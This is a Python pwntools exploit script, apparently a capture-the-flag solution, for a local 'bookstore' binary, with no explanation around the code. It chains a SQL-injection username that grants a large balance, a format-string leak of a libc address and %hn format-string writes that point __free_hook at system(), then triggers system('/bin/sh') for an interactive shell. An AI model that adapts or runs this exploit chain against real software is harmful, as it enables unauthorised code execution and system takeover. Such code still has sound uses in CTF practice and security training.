from pwn import *

p = process("./bookstore")
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = process(['./ld-50390b2ae8aaa73c47745040f54e602f.so.2', './bookstore'], env={"LD_PRELOAD":"./libc.so.6"})
# lib = ELF("./libc.so.6")

def register(name):
    username = f"{name}', '{name}', {(1<<31) - 1}) --"
    p.sendlineafter("Choice:", '1')
    p.sendlineafter("Username:", username)
    p.sendlineafter("Password:", '')

def login(name):
    p.sendlineafter("Choice:", '2')
    p.sendlineafter("Username:", name)
    p.sendlineafter("Password:", name)

def logout():
    p.sendlineafter("Choice:", '6')

def writeBook():
    p.sendlineafter("Choice:", '4')
    for i in range(3): 
        p.sendlineafter(":", '/bin/sh')
    
def store():
    p.sendlineafter("Choice:", '3')

def sell(index):
    p.sendlineafter(">>", '1')
    p.sendlineafter(":", str(index))

def fsb(payload):
    p.sendlineafter(">>", '2')
    p.sendlineafter("Enter address:", payload)

register('zzre')
login('zzre')
writeBook()
store()

# libc leak
fsb("%1$p@@")
p.recvuntil("0x")
libc_base = int(p.recvuntil("@@")[:-2], 16) - lib.sym['_IO_2_1_stdout_'] - 131
print(hex(libc_base))

system = libc_base + lib.sym['system']
free_hook = libc_base + lib.sym['__free_hook']
print(hex(free_hook))
pause()

# free_hook -> system
payload = ''
tmp = 0
for i in range(3):
    val = (system >> i*16) & 0xffff
    payload += f'%{(val - tmp) & 0xffff}c%{{}}$hn'
    tmp = val

idx = 8 + (len(payload) // 8) + 2       # payload[len(payload) + 16:] = addr
payload = payload.format(idx, idx+1, idx+2).encode()
payload = payload.ljust((len(payload) // 8)*8 + 16)

for i in range(3):
    payload += p64(free_hook + 2*i)

fsb(payload)

# system("/bin/sh")
sell(0)

p.interactive()
